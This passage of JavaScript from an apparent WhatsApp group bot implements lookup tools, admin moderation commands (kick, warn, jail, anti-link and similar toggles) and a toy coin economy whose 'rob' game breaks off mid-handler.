    if (!word) return reply(`📖 Usage: ${prefix}define <word>\nExample: ${prefix}define perseverance`);
    try {
        await reply('⏳ Looking up definition...');
        const res = await axios.get(`https://api.dictionaryapi.dev/api/v2/entries/en/${encodeURIComponent(word)}`, { timeout: 8000 });
        const entry = res.data[0];
        const meanings = entry.meanings.slice(0, 2).map(m => {
            const defs = m.definitions.slice(0, 2).map((d, i) => `  ${i + 1}. ${d.definition}`).join('\n');
            return `📌 *${m.partOfSpeech}*\n${defs}`;
        }).join('\n\n');
        const phonetic = entry.phonetic || entry.phonetics?.[0]?.text || '';
        reply(
`📖━━━━━[ DICTIONARY ]━━━━━📖

🔤 *Word:* ${entry.word}
🗣️ *Phonetic:* ${phonetic}

${meanings}

📖━━━━━━━━━━━━━━━━━📖`
        );
    } catch (e) {
        reply(`❌ No definition found for *${word}*.`);
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  TOOLS — CURRENCY
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'currency':
case 'conv': {
    if (args.length < 3) return reply(`💱 Usage: ${prefix}currency <amount> <from> <to>\nExample: ${prefix}currency 100 USD EUR`);
    const amount = parseFloat(args[0]);
    const from = args[1].toUpperCase();
    const to = args[2].toUpperCase();
    if (isNaN(amount)) return reply('❌ Invalid amount.');
    try {
        const res = await axios.get(`https://open.er-api.com/v6/latest/${from}`, { timeout: 8000 });
        if (res.data.result !== 'success') return reply(`❌ Invalid currency code: *${from}*`);
        const rate = res.data.rates[to];
        if (!rate) return reply(`❌ Currency *${to}* not found.`);
        const converted = (amount * rate).toFixed(2);
        reply(`💱━━━━━[ CURRENCY ]━━━━━💱\n\n${amount} ${from} = *${converted} ${to}*\n📊 Rate: 1 ${from} = ${rate} ${to}\n\n💱━━━━━━━━━━━━━━━━━💱`);
    } catch (e) {
        reply('❌ Conversion failed. Check your currency codes.');
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  TOOLS — MY ID
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'myid': {
    reply(
`🆔━━━━━[ IDENTITY ]━━━━━🆔

👤 *Your ID:* ${m.sender.split('@')[0]}
${isGroup ? `👥 *Group ID:* ${m.chat.split('@')[0]}\n` : ''}🤖 *Bot ID:* ${botNumber.split('@')[0]}

🆔━━━━━━━━━━━━━━━━━🆔`
    );
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  TOOLS — OWNER CONTACT
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'owner': {
    try {
        const ownerNum = (owner[0] || '').replace(/[^0-9]/g, '');
        const ownerName = global.OWNER_NAME || 'ZUKO XMD Owner';
        await empire.sendMessage(m.chat, {
            contacts: {
                displayName: ownerName,
                contacts: [{ vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:${ownerName}\nTEL;type=CELL;type=VOICE;waid=${ownerNum}:+${ownerNum}\nEND:VCARD` }]
            }
        }, { quoted: m });
    } catch (e) {
        reply(`❌ Failed to send owner contact: ${e.message}`);
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  GROUP — MUTE / UNMUTE
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'mute':
case 'lock':
case 'close': {
    if (!isGroup) return reply("👥 Group only!");
    if (!isCreator && !isAdmins) return reply("❌ Admins only!");
    await empire.groupSettingUpdate(m.chat, 'announcement');
    reply(`🔒 *Group locked!*\nOnly admins can send messages.`);
    break;
}
case 'unmute':
case 'unlock':
case 'open': {
    if (!isGroup) return reply("👥 Group only!");
    if (!isCreator && !isAdmins) return reply("❌ Admins only!");
    await empire.groupSettingUpdate(m.chat, 'not_announcement');
    reply(`🔓 *Group unlocked!*\nEveryone can send messages.`);
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  GROUP — KICK / PROMOTE / DEMOTE
case 'kick':
case 'remove': {
    if (!isGroup) return reply("👥 Group only!");
    if (!isCreator && !isAdmins) return reply("❌ Admins only!");
    let target = m.mentionedJid?.[0] || (m.quoted ? m.quoted.sender : null);
    if (!target) return reply(`Usage: ${prefix}kick @user`);
    if (target === botNumber) return reply("❌ Can't kick the bot!");
    await empire.groupParticipantsUpdate(m.chat, [target], 'remove');
    await empire.sendMessage(m.chat, { text: `👢 @${target.split('@')[0]} has been kicked!`, mentions: [target] }, { quoted: m });
    break;
}
case 'promote':
case 'makeadmin': {
    if (!isGroup) return reply("👥 Group only!");
    if (!isCreator && !isAdmins) return reply("❌ Admins only!");
    let target = m.mentionedJid?.[0] || (m.quoted ? m.quoted.sender : null);
    if (!target) return reply(`Usage: ${prefix}promote @user`);
    await empire.groupParticipantsUpdate(m.chat, [target], 'promote');
    await empire.sendMessage(m.chat, { text: `⬆️ @${target.split('@')[0]} promoted to admin!`, mentions: [target] }, { quoted: m });
    break;
}
case 'demote':
case 'unadmin': {
    if (!isGroup) return reply("👥 Group only!");
    if (!isCreator && !isAdmins) return reply("❌ Admins only!");
    let target = m.mentionedJid?.[0] || (m.quoted ? m.quoted.sender : null);
    if (!target) return reply(`Usage: ${prefix}demote @user`);
    await empire.groupParticipantsUpdate(m.chat, [target], 'demote');
    await empire.sendMessage(m.chat, { text: `⬇️ @${target.split('@')[0]} demoted!`, mentions: [target] }, { quoted: m });
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  GROUP — ADD MEMBER
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'add': {
    if (!isGroup) return reply("👥 Group only!");
    if (!isCreator && !isAdmins) return reply("❌ Admins only!");
    const number = text.replace(/[^0-9]/g, '');
    if (!number) return reply(`Usage: ${prefix}add 234XXXXXXXXX`);
    try {
        const jid = `${number}@s.whatsapp.net`;
        await empire.groupParticipantsUpdate(m.chat, [jid], 'add');
        reply(`✅ *Invite sent to* ${number}`);
    } catch (e) {
        reply(`❌ Failed to add ${number}: ${e.message}`);
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  GROUP — WARN SYSTEM
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'warn': {
    if (!isGroup) return reply("👥 Group only!");
    if (!isCreator && !isAdmins) return reply("❌ Admins only!");
    let target = m.mentionedJid?.[0] || (m.quoted ? m.quoted.sender : null);
    if (!target) return reply(`Usage: ${prefix}warn @user <reason>`);
    const reason = text.replace(/@\S+/, '').trim() || "No reason provided";
    const k = `${m.chat}_${target}`;
    db.warns[k] = (db.warns[k] || 0) + 1; saveDB();
    const count = db.warns[k];
    let msg = `⚠️ *WARNING ${count}/3*\n\n👤 @${target.split('@')[0]}\n📌 Reason: ${reason}`;
    if (count >= 3 && isBotAdmins) {
        await empire.groupParticipantsUpdate(m.chat, [target], 'remove');
        msg += `\n\n👢 *Kicked for reaching 3 warnings!*`;
        delete db.warns[k]; saveDB();
    }
    await empire.sendMessage(m.chat, { text: msg, mentions: [target] }, { quoted: m });
    break;
}
case 'unwarn':
case 'resetwarn': {
    if (!isGroup) return reply("👥 Group only!");
    if (!isCreator && !isAdmins) return reply("❌ Admins only!");
    let target = m.mentionedJid?.[0] || (m.quoted ? m.quoted.sender : null);
    if (!target) return reply(`Usage: ${prefix}unwarn @user`);
    delete db.warns[`${m.chat}_${target}`]; saveDB();
    await empire.sendMessage(m.chat, { text: `✅ Warnings cleared for @${target.split('@')[0]}`, mentions: [target] }, { quoted: m });
    break;
}
case 'warns':
case 'checkwarns': {
    if (!isGroup) return reply("👥 Group only!");
    const target = m.mentionedJid?.[0] || m.quoted?.sender || m.sender;
    const count = db.warns[`${m.chat}_${target}`] || 0;
    reply(`⚠️ *${target.split('@')[0]}* has *${count}/3* warnings.`);
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  GROUP — TAG ALL / ADMINS
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  TAG ALL — VERTICAL WITH BULLETS
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'tagall':
case 'everyone': {
    if (!isGroup) return reply("👥 Group only!");
    if (!isCreator && !isAdmins) return reply("❌ Admins only!");
    
    const msg = text || "📢 Attention everyone!";
    const mentions = participants.map(p => p.id);
    
    // Vertical with bullet points
    const tags = mentions.map(p => `• @${p.split('@')[0]}`).join('\n');
    const memberCount = participants.length;
    
    await empire.sendMessage(m.chat, { 
        text: `${msg}\n\n👥 *Members (${memberCount})*\n${'─'.repeat(20)}\n${tags}`,
        mentions 
    }, { quoted: m });
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  TAG ADMINS — VERTICAL WITH BULLETS
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'tagadmins':
case 'admins': {
    if (!isGroup) return reply("👥 Group only!");
    if (!isCreator && !isAdmins) return reply("❌ Admins only!");
    
    const msg = text || "📢 Admin alert!";
    const adminMentions = groupAdmins.map(a => a.id || a);
    const adminNames = groupAdmins.map(a => {
        const id = a.id || a;
        return `• @${id.split('@')[0]}`;
    }).join('\n');
    
    const adminCount = groupAdmins.length;
    
    await empire.sendMessage(m.chat, { 
        text: `${msg}\n\n👑 *Admins (${adminCount})*\n${'─'.repeat(20)}\n${adminNames}`,
        mentions: adminMentions 
    }, { quoted: m });
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  GROUP — HIDETAG
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'hidetag': {
    if (!isGroup) return reply("👥 Group only!");
    if (!isCreator && !isAdmins) return reply("❌ Admins only!");
    const msg = text || "📢";
    const mentions = participants.map(p => p.id);
    await empire.sendMessage(m.chat, { text: msg, mentions }, { quoted: m });
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  GROUP — INFO
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'groupinfo':
case 'gcinfo': {
    if (!isGroup) return reply("👥 Group only!");
    const adminList = groupAdmins.map(a => `  👑 @${a.split('@')[0]}`).join('\n');
    await empire.sendMessage(m.chat, {
        text:
`ℹ️━━━━━[ GROUP INFO ]━━━━━ℹ️

📛 *Name:*    ${groupName}
👥 *Members:* ${participants.length}
👑 *Admins:*  ${groupAdmins.length}

👑 *Admin List:*
${adminList}

ℹ️━━━━━━━━━━━━━━━━━ℹ️`,
        mentions: groupAdmins
    }, { quoted: m });
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  GROUP — SET NAME / DESCRIPTION
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'setname':
case 'setsubject': {
    if (!isGroup) return reply("👥 Group only!");
    if (!isCreator && !isAdmins) return reply("❌ Admins only!");
    if (!text) return reply(`Usage: ${prefix}setname <new group name>`);
    try {
        await empire.groupUpdateSubject(m.chat, text);
        reply(`✅ *Group name updated to:*\n${text}`);
    } catch (e) {
        reply(`❌ Failed to update name: ${e.message}`);
    }
    break;
}
case 'setdesc': {
    if (!isGroup) return reply("👥 Group only!");
    if (!isCreator && !isAdmins) return reply("❌ Admins only!");
    if (!text) return reply(`Usage: ${prefix}setdesc <new description>`);
    try {
        await empire.groupUpdateDescription(m.chat, text);
        reply(`✅ *Group description updated!*`);
    } catch (e) {
        reply(`❌ Failed to update description: ${e.message}`);
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  GROUP — SET PHOTO
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'setppic':
case 'setgcpic': {
    if (!isGroup) return reply("👥 Group only!");
    if (!isCreator && !isAdmins) return reply("❌ Admins only!");
    const quoted = m.quoted ? m.quoted : m;
    if (!/image/.test(quoted.mimetype || '')) return reply(`🖼️ Reply to an image with ${prefix}setppic`);
    try {
        const buf = await empire.downloadMediaMessage(quoted);
        await empire.updateProfilePicture(m.chat, buf);
        reply(`✅ *Group photo updated!*`);
    } catch (e) {
        reply(`❌ Failed to update photo: ${e.message}`);
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  GROUP — INVITE LINK
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'grouplink':
case 'gclink': {
    if (!isGroup) return reply("👥 Group only!");
    if (!isCreator && !isAdmins) return reply("❌ Admins only!");
    try {
        const code = await empire.groupInviteCode(m.chat);
        reply(`🔗━━━━━[ GROUP LINK ]━━━━━🔗\n\nhttps://chat.whatsapp.com/${code}\n\n🔗━━━━━━━━━━━━━━━━━🔗`);
    } catch (e) {
        reply(`❌ Failed to fetch group link: ${e.message}`);
    }
    break;
}
case 'revokelink':
case 'resetlink': {
    if (!isGroup) return reply("👥 Group only!");
    if (!isCreator && !isAdmins) return reply("❌ Admins only!");
    try {
        await empire.groupRevokeInvite(m.chat);
        reply(`✅ *Group invite link has been reset!*\nUse ${prefix}grouplink to get the new one.`);
    } catch (e) {
        reply(`❌ Failed to reset link: ${e.message}`);
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  GROUP — POLL
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'poll': {
    if (!text || !text.includes('|')) return reply(`📊 Usage: ${prefix}poll Question? | Option1 | Option2 | Option3\n(2-12 options, separated by |)`);
    const parts = text.split('|').map(s => s.trim()).filter(Boolean);
    const question = parts.shift();
    const options = parts.slice(0, 12);
    if (!question || options.length < 2) return reply(`📊 Provide a question and at least 2 options, separated by |`);
    try {
        await empire.sendMessage(m.chat, {
            poll: { name: question, values: options, selectableCount: 1 }
        }, { quoted: m });
    } catch (e) {
        reply(`❌ Failed to create poll: ${e.message}`);
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  ANTI-BOT
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'antibot': {
    if (!isGroup) return reply("👥 Group only!");
    if (!isCreator && !isAdmins) return reply("❌ Admins only!");
    const opt = args[0]?.toLowerCase();
    if (opt === 'on') { setSetting(m.chat, 'antibot', true); reply(`🤖 *ANTI-BOT ON*\nNew members with no profile picture will be auto-removed.`); }
    else if (opt === 'off') { setSetting(m.chat, 'antibot', false); reply(`✅ *ANTI-BOT OFF*`); }
    else {
        const s = getSetting(m.chat, 'antibot', false);
        reply(`🤖 *ANTI-BOT*\nStatus: ${s ? '🟢 ON' : '🔴 OFF'}\n\n${prefix}antibot on/off\n_Heuristic: kicks new joiners with no profile picture set._`);
    }
    break;
}
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  ANTI-LINK (FIXED)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  ANTI-LINK COMMAND (WORKING)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'antilink':
case 'al': {
    if (!isGroup) return reply("👥 Group only!");
    if (!isCreator && !isAdmins) return reply("❌ Admins only!");
    
    const opt = args[0]?.toLowerCase();
    
    if (opt === 'on') { 
        setSetting(m.chat, 'antilink', true); 
        setSetting(m.chat, 'antilink_action', 'delete'); 
        reply(`🔗 *ANTI-LINK ENABLED*\n\nLinks will be deleted.\nAction: DELETE\n\n${prefix}antilink action <delete/warn/kick>\n${prefix}antilink allowed <domain>`); 
    } 
    else if (opt === 'off') { 
        setSetting(m.chat, 'antilink', false); 
        reply(`✅ *ANTI-LINK DISABLED*`); 
    } 
    else if (opt === 'action') {
        const a = args[1]?.toLowerCase();
        if (['delete','warn','kick'].includes(a)) { 
            setSetting(m.chat, 'antilink_action', a); 
            reply(`✅ Action set to: *${a.toUpperCase()}*`); 
        } else {
            reply(`📌 *Actions:* delete, warn, kick\n\nExample: ${prefix}antilink action kick`);
        }
    } 
    else if (opt === 'allowed') {
        const domain = args[1]?.toLowerCase();
        if (!domain) {
            const allowed = getSetting(m.chat, 'allowedDomains', []);
            return reply(`📌 *Allowed Domains:*\n${allowed.length ? allowed.map(d => `• ${d}`).join('\n') : 'None'}\n\nAdd: ${prefix}antilink allowed <domain>`);
        }
        const allowed = getSetting(m.chat, 'allowedDomains', []);
        if (!allowed.includes(domain)) {
            allowed.push(domain);
            setSetting(m.chat, 'allowedDomains', allowed);
            reply(`✅ *Added ${domain} to allowed domains.*`);
        } else {
            reply(`⚠️ *${domain} is already allowed.*`);
        }
    } 
    else if (opt === 'debug') {
        const s = getSetting(m.chat, 'antilink', false);
        const a = getSetting(m.chat, 'antilink_action', 'delete');
        const allowed = getSetting(m.chat, 'allowedDomains', []);
        reply(`🔍 *ANTI-LINK DEBUG*\n\nStatus: ${s ? '🟢 ON' : '🔴 OFF'}\nAction: ${a.toUpperCase()}\nAllowed: ${allowed.length ? allowed.join(', ') : 'None'}\nGroup: ${m.chat}\n\n${prefix}antilink on/off\n${prefix}antilink action <delete/warn/kick>\n${prefix}antilink allowed <domain>`);
    }
    else {
        const s = getSetting(m.chat, 'antilink', false);
        const a = getSetting(m.chat, 'antilink_action', 'delete');
        const allowed = getSetting(m.chat, 'allowedDomains', []);
        reply(`🔗 *ANTI-LINK STATUS*\n\nStatus: ${s ? '🟢 ON' : '🔴 OFF'}\nAction: ${a.toUpperCase()}\nAllowed: ${allowed.length ? allowed.join(', ') : 'None'}\n\n${prefix}antilink on/off\n${prefix}antilink action <delete/warn/kick>\n${prefix}antilink allowed <domain>\n${prefix}antilink debug`);
    }
    break;
}
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  ANTI-STICKER
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'antisticker': {
    if (!isGroup) return reply("👥 Group only!");
    if (!isCreator && !isAdmins) return reply("❌ Admins only!");
    const opt = args[0]?.toLowerCase();
    if (opt === 'on') { setSetting(m.chat, 'antisticker', true); reply(`🎭 *ANTI-STICKER ON*`); }
    else if (opt === 'off') { setSetting(m.chat, 'antisticker', false); reply(`✅ *ANTI-STICKER OFF*`); }
    else if (opt === 'action') {
        const a = args[1]?.toLowerCase();
        if (['delete','warn','kick'].includes(a)) { setSetting(m.chat, 'antisticker_action', a); reply(`✅ Anti-sticker action: *${a.toUpperCase()}*`); }
        else reply(`Actions: delete, warn, kick`);
    } else {
        const s = getSetting(m.chat, 'antisticker', false);
        reply(`🎭 *ANTI-STICKER*\nStatus: ${s ? '🟢 ON' : '🔴 OFF'}\n\n${prefix}antisticker on/off\n${prefix}antisticker action <delete/warn/kick>`);
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  ANTI-DELETE
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'antidelete':
case 'ad': {
    // Pass isCreator to the command
    await antidelete.handleCommand(empire, m.chat, m, text, isCreator);
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  ANTI-CALL
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'anticall': {
    if (!isCreator) return reply("❌ Owner only!");
    const opt = args[0]?.toLowerCase();
    if (opt === 'on') { setSetting('global', 'anticall', true); reply(`📵 *ANTI-CALL ON*\nAll incoming calls will be rejected.`); }
    else if (opt === 'off') { setSetting('global', 'anticall', false); reply(`✅ *ANTI-CALL OFF*`); }
    else {
        const s = getSetting('global', 'anticall', false);
        reply(`📵 *ANTI-CALL*\nStatus: ${s ? '🟢 ON' : '🔴 OFF'}\n\n${prefix}anticall on/off`);
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  ANTI-VIEWONCE
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'antiviewonce':
case 'avo': {
    if (!isGroup) return reply("👥 Group only!");
    if (!isCreator && !isAdmins) return reply("❌ Admins only!");
    const opt = args[0]?.toLowerCase();
    if (opt === 'on') { setSetting(m.chat, 'antiviewonce', true); reply(`👁️ *ANTI-VIEWONCE ON*`); }
    else if (opt === 'off') { setSetting(m.chat, 'antiviewonce', false); reply(`✅ *ANTI-VIEWONCE OFF*`); }
    else {
        const s = getSetting(m.chat, 'antiviewonce', false);
        reply(`👁️ *ANTI-VIEWONCE*\nStatus: ${s ? '🟢 ON' : '🔴 OFF'}\n\n${prefix}antiviewonce on/off`);
    }
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  WELCOME / GOODBYE
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'welcome': {
    if (!isGroup) return reply("👥 Group only!");
    if (!isCreator && !isAdmins) return reply("❌ Admins only!");
    const opt = args[0]?.toLowerCase();
    if (opt === 'on') { setSetting(m.chat, 'welcome', true); reply(`👋 *WELCOME ON*\nCustomize: ${prefix}setwelcome <msg>\nVariables: @user @group`); }
    else if (opt === 'off') { setSetting(m.chat, 'welcome', false); reply(`✅ *WELCOME OFF*`); }
    else {
        const s = getSetting(m.chat, 'welcome', false), msg = getSetting(m.chat, 'welcomeMessage', '👋 Welcome @user to @group!');
        reply(`👋 *WELCOME*\nStatus: ${s ? '🟢 ON' : '🔴 OFF'}\nMessage: ${msg}\n\n${prefix}welcome on/off\n${prefix}setwelcome <msg>`);
    }
    break;
}
case 'setwelcome': {
    if (!isGroup) return reply("👥 Group only!");
    if (!isCreator && !isAdmins) return reply("❌ Admins only!");
    if (!text) return reply(`Usage: ${prefix}setwelcome <message>\nVariables: @user @group`);
    setSetting(m.chat, 'welcomeMessage', text);
    reply(`✅ *Welcome message set!*\n\n${text}`);
    break;
}
case 'goodbye': {
    if (!isGroup) return reply("👥 Group only!");
    if (!isCreator && !isAdmins) return reply("❌ Admins only!");
    const opt = args[0]?.toLowerCase();
    if (opt === 'on') { setSetting(m.chat, 'goodbye', true); reply(`👋 *GOODBYE ON*\nCustomize: ${prefix}setgoodbye <msg>`); }
    else if (opt === 'off') { setSetting(m.chat, 'goodbye', false); reply(`✅ *GOODBYE OFF*`); }
    else {
        const s = getSetting(m.chat, 'goodbye', false);
        reply(`👋 *GOODBYE*\nStatus: ${s ? '🟢 ON' : '🔴 OFF'}\n\n${prefix}goodbye on/off\n${prefix}setgoodbye <msg>`);
    }
    break;
}
case 'setgoodbye': {
    if (!isGroup) return reply("👥 Group only!");
    if (!isCreator && !isAdmins) return reply("❌ Admins only!");
    if (!text) return reply(`Usage: ${prefix}setgoodbye <message>`);
    setSetting(m.chat, 'goodbyeMessage', text);
    reply(`✅ *Goodbye message set!*\n\n${text}`);
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  JAIL SYSTEM
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'jail': {
    if (!isGroup) return reply("👥 Group only!");
    if (!isCreator && !isAdmins) return reply("❌ Admins only!");
    let target = m.mentionedJid?.[0] || (m.quoted ? m.quoted.sender : null);
    if (!target) return reply(`Usage: ${prefix}jail @user <reason> [minutes]`);
    if (target === botNumber || target === m.sender) return reply("❌ Can't jail yourself or the bot!");
    let reason = text.replace(/@\S+/, '').trim();
    let duration = null;
    const words = reason.split(' '), last = words[words.length - 1];
    if (!isNaN(last) && parseInt(last) > 0) { duration = parseInt(last); reason = words.slice(0, -1).join(' ').trim(); }
    if (!reason) reason = "No reason provided";
    const jr = await jailUser(empire, m.chat, target, reason, duration, m.sender);
    await empire.sendMessage(m.chat, {
        text: `🔒 *USER JAILED*\n\n👤 @${target.split('@')[0]}\n📌 Reason: ${reason}\n⏱️ Duration: ${jr.durationText}\n👑 By: @${m.sender.split('@')[0]}`,
        mentions: [target, m.sender]
    }, { quoted: m });
    break;
}
case 'unjail':
case 'release': {
    if (!isGroup) return reply("👥 Group only!");
    if (!isCreator && !isAdmins) return reply("❌ Admins only!");
    let target = m.mentionedJid?.[0] || (m.quoted ? m.quoted.sender : null);
    if (!target) return reply(`Usage: ${prefix}unjail @user`);
    const ok = await unjailUser(m.chat, target);
    if (ok) await empire.sendMessage(m.chat, { text: `🔓 @${target.split('@')[0]} has been released!`, mentions: [target] }, { quoted: m });
    else reply(`❌ User is not jailed.`);
    break;
}
case 'jailed':
case 'jaillist': {
    if (!isGroup) return reply("👥 Group only!");
    if (!isCreator && !isAdmins) return reply("❌ Admins only!");
    const gj = db.jailed?.[m.chat] || {};
    const list = Object.keys(gj);
    if (!list.length) return reply("✅ No jailed users.");
    const txt = list.map(jid => {
        const d = gj[jid];
        const rem = d.until ? `${Math.ceil((d.until - Date.now()) / 60000)}m left` : 'Permanent';
        return `🔒 @${jid.split('@')[0]} — ${d.reason} (${rem})`;
    }).join('\n');
    await empire.sendMessage(m.chat, { text: `🔒 *JAILED USERS*\n\n${txt}`, mentions: list }, { quoted: m });
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  BOT OWNER SETTINGS
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'autobio': {
    if (!isCreator) return reply("❌ Owner only!");
    const opt = args[0]?.toLowerCase();
    if (opt === 'on') { autoBioEnabled = true; await updateAutoBio(empire); reply(`✅ *AUTO BIO ON*`); }
    else if (opt === 'off') { autoBioEnabled = false; reply(`❌ *AUTO BIO OFF*`); }
    else if (opt === 'now') { await updateAutoBio(empire); reply(`✅ *BIO UPDATED*`); }
    else reply(`🧬 *AUTO BIO*\nStatus: ${autoBioEnabled ? '🟢 ON' : '🔴 OFF'}\n\n${prefix}autobio on/off/now`);
    break;
}
case 'autoreact': {
    if (!isCreator) return reply("❌ Owner only!");
    const opt = args[0]?.toLowerCase();
    if (opt === 'on') { autoMessageReact = true; reply(`✅ *AUTO-REACT ON*`); }
    else if (opt === 'off') { autoMessageReact = false; reply(`✅ *AUTO-REACT OFF*`); }
    else reply(`💫 *AUTO-REACT*\nStatus: ${autoMessageReact ? '🟢 ON' : '🔴 OFF'}\n\n${prefix}autoreact on/off`);
    break;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  ECONOMY — BALANCE
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'balance':
case 'bal': {
    const target = m.mentionedJid?.[0] || m.sender;
    const acc = ensureEconomy(target);
    reply(
`💰━━━━━[ BALANCE ]━━━━━💰

👤 @${target.split('@')[0]}
👛 *Wallet:* ${fmtCoins(acc.wallet)} coins
🏦 *Bank:*   ${fmtCoins(acc.bank)} coins
💎 *Total:*  ${fmtCoins(acc.wallet + acc.bank)} coins

💰━━━━━━━━━━━━━━━━━💰`
    );
    break;
}
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  ECONOMY — ROB
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
case 'rob':
case 'steal': {
    const target = m.mentionedJid?.[0] || (m.quoted ? m.quoted.sender : null);
    if (!target) return reply(`🔫 Usage: ${prefix}rob @user`);
    if (target === m.sender) return reply('❌ You can\'t rob yourself!');
    
    const acc = ensureEconomy(m.sender);
    const targetAcc = ensureEconomy(target);
    
    // Check if target has protection
    if (targetAcc.protected && targetAcc.protectedUntil > Date.now()) {
        return reply(`🛡️ @${target.split('@')[0]} is under protection! You can't rob them.`, { mentions: [target] });
    }
    
    // Check if target is in hospital
    if (targetAcc.hospital && targetAcc.hospitalUntil > Date.now()) {
        return reply(`🏥 @${target.split('@')[0]} is in the hospital! You can't rob them.`, { mentions: [target] });
    }
    
    // Check if user is in hospital
    if (acc.hospital && acc.hospitalUntil > Date.now()) {
        return reply(`🏥 You're in the hospital! Use ${prefix}hospital to heal.`);
    }
    
    const robAmount = Math.floor(targetAcc.wallet * (0.1 + Math.random() * 0.25));
    if (robAmount < 50) return reply(`💀 @${target.split('@')[0]} is too broke to rob!`, { mentions: [target] });
    
    const success = Math.random() < 0.45; // 45% chance
    const jailChance = Math.random() < 0.2; // 20% jail risk
    
    if (success && !jailChance) {
        acc.wallet += robAmount;
        targetAcc.wallet -= robAmount;
        saveDB();
        await empire.sendMessage(m.chat, {
            text: `🔫 *ROBBERY SUCCESSFUL!*\n\n@${m.sender.split('@')[0]} robbed @${target.split('@')[0]} for *${fmtCoins(robAmount)} coins*! 💰\n\n💀 *Crime doesn't pay... or does it?*`,
            mentions: [m.sender, target]
        }, { quoted: m });
    } else if (success && jailChance) {
        // Got caught but still robbed
        acc.wallet += robAmount;
        targetAcc.wallet -= robAmount;
        acc.jailCount = (acc.jailCount || 0) + 1;
        if (acc.jailCount >= 3) {
            acc.wallet -= 500;
            reply(`🔫 *ROBBERY SUCCESSFUL but you got CAUGHT!*\n\n@${m.sender.split('@')[0]} robbed @${target.split('@')[0]} for *${fmtCoins(robAmount)} coins* but was arrested!\n\n👮 *You've been jailed 3 times! Fine: -500 coins*`, { mentions: [m.sender, target] });
        } else {
            reply(`🔫 *ROBBERY SUCCESSFUL but you got CAUGHT!*\n\n@${m.sender.split('@')[0]} robbed @${target.split('@')[0]} for *${fmtCoins(robAmount)} coins* but was arrested!\n\n👮 *Jail count: ${acc.jailCount}/3*`, { mentions: [m.sender, target] });
        }
        saveDB();
    } else {
        // Failed robbery
        const fine = Math.floor(robAmount * 0.1);
        acc.wallet -= fine;
        saveDB();
        await empire.sendMessage(m.chat, {
